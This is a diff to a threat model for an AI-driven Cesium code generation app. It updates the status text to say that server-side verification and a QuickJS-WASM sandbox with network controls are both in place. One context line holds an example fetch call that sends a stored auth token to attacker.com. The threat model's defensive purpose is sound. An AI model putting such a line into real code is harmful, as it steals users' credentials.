@@ -6,7 +6,9 @@ This document outlines potential security vulnerabilities in the AI-driven Cesiu
 
 This is intentionally a **forward-looking threat model, not just a description of the current code**. It documents the full range of realistic attacks and the mitigations needed to defend against them — **including mitigations that are not yet implemented**. Treat unimplemented items as a security backlog / hardening roadmap, not as optional.
 
-**Current status:** this repo executes verified code directly in the browser (Gate 1 server-side static verification only). Gate 2 (browser-side sandbox isolation) is not implemented — code runs directly against the live Viewer with security relying solely on server-side AST verification. Runtime isolation via a sandboxed interpreter is recommended as a follow-up hardening step.
+**Current status:** both gates are implemented. Gate 1 statically verifies generated code on the
+server; Gate 2 executes approved code in a fresh QuickJS-WASM interpreter with timeout, memory,
+collection, property, and network-URL controls before calls reach the live Viewer.
 
 ### Architecture View (components, trust boundaries & security gates)
 
@@ -314,7 +316,8 @@ fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'));
 3. **Sandbox Execution** — Runtime execution is handled downstream in the frontend via a sandboxed environment. Even if validation misses something:
    - Code runs isolated from the main application context
    - Cannot access main app globals
-   - Cannot make unrestricted fetch calls
+   - Cannot call browser network globals; Cesium API URL arguments are denied by default and can
+     only target origins explicitly configured through `allowedNetworkOrigins`
 
 ---
 
